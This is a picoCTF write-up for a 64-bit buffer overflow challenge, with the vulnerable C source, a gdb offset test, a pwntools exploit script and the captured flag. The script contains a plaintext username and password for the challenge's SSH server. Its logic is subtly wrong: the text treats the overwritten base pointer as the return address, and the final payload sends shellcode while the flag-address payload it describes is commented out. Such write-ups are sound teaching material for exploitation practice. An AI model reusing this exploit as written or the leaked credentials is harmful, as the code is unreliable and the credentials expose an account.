# Problem
Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/af55e2160361c86caddba4c58680cad7/vuln). You can find it in /problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89 on the shell server. [Source](https://2019shell1.picoctf.com/static/af55e2160361c86caddba4c58680cad7/vuln.c).

## Hints:
Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/af55e2160361c86caddba4c58680cad7/vuln
wget https://2019shell1.picoctf.com/static/af55e2160361c86caddba4c58680cad7/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

The call to ```gets()``` in ```vuln()``` is unsafe, there is no limit checking.

We can override the return address and jump to ```flag()```.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPP)
p $rbp
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x00000000004007e7 in vuln ()
$1 = (void *) 0x4949494949494949
```

We know that ```IIIIIIII``` overrides the return address.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/newoverflow-1_3_e53f871ba121b62d35646880e2577f89')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('flag:')
p.sendline('AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIII' + asm(shellcraft.amd64.linux.sh()))#p64(binary.symbols['flag'] * 20))

print p.recvall()
```

Flag: picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}